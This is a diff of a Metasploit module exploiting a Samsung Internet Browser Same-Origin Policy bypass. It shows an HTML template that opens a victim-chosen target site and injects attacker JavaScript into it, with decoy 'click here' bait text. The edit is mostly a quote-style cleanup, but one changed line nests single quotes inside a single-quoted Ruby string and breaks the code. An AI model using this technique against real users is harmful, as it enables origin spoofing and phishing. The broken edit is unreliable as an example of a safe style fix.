@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => "Samsung Internet Browser SOP Bypass",
+        'Name'           => 'Samsung Internet Browser SOP Bypass',
         'Description'    => %q(
           This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the
           Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.
@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
         'References'     => [
         ['URL', 'http://fr.0day.today/exploit/description/28434'],
         ],
-        'DisclosureDate' => "Nov 08 2017",
+        'DisclosureDate' => 'Nov 08 2017',
         'Actions'        => [[ 'WebServer' ]],
         'PassiveActions' => [ 'WebServer' ],
         'DefaultAction'  => 'WebServer'
@@ -36,20 +36,20 @@ class MetasploitModule < Msf::Auxiliary
   register_options([
       OptString.new('TARGET_URL', [
         true,
-        "The URL to spoof origin from.",
+        'The URL to spoof origin from.',
         'http://example.com/'
       ]),
       OptString.new('CUSTOM_HTML', [
         true,
-        "HTML to display to the victim.",
+        'HTML to display to the victim.',
         'This page has moved. Please <a href="#">click here</a> redirect your browser.'
-      ]),
+      ])
     ])
 
   register_advanced_options([
     OptString.new('CUSTOM_JS', [
       false,
-      "Custom Javascript to inject as the go() function. Use the variable 'x' to refer to the new tab.",
+      'Custom Javascript to inject as the go() function. Use the variable 'x' to refer to the new tab.',
       ''
     ])
   ])
@@ -84,12 +84,14 @@ class MetasploitModule < Msf::Auxiliary
     @html = <<-EOS
         <html>
         <meta charset="UTF-8">
+        <head>
         <script>
         function go(){
           var x = window.open('#{datastore['TARGET_URL']}');
           #{evil_javascript}
           }
         </script>
+        </head>
         <body onclick="go()">
         #{datastore['CUSTOM_HTML']}
         </body></html>
